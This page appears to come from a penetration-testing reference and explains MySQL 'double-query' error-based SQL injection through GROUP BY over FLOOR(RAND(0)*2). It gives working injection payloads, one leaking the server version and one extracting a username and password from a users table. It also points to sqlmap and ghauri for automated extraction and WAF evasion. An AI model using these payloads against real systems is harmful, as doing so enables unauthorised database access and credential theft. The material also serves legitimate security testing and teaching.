---
title: "FLOOR double-query error-based injection in MySQL"
description: "Leaking MySQL data through a duplicate-key error forced by GROUP BY over FLOOR(RAND(0)*2), the error channel that predates the XPath functions."
keywords:
  - double query injection
  - FLOOR RAND
  - GROUP BY error
  - duplicate entry
  - error based injection
---

# FLOOR double-query

Before the XPath functions existed, error-based leaks used a duplicate-key error from `GROUP BY` over `FLOOR(RAND(0)*2)`. It is the fallback on servers older than 5.1.5 and where `EXTRACTVALUE`/`UPDATEXML` are filtered, and it has no 32-character truncation.

The payload groups rows by a value that concatenates the target data with `FLOOR(RAND(0)*2)`. The seeded `RAND(0)` is deterministic, and its interaction with `GROUP BY` makes the grouped key get computed twice for one group, which inserts a duplicate temporary-table key and raises an error that contains the concatenated value:

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- 
```

The response carries `Duplicate entry '8.0.36:1' for key '<group_key>'`, leaking the subquery result before the colon. Swap the inner `SELECT` for any single-value query:

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- 
```

The aggregate needs several rows to trigger the collision reliably, so `information_schema.tables` (or `information_schema.columns`) is used as the row source because it always has enough rows. Keep the leaking subquery to one row, as with the XPath channels.

## Tools

- **sqlmap**: automated error-based extraction including the FLOOR/RAND double-query technique.
- **ghauri**: fast alternative with strong WAF evasion.

## References

- MySQL Reference Manual: GROUP BY, aggregate functions, RAND
- OWASP Testing Guide: Testing for SQL Injection
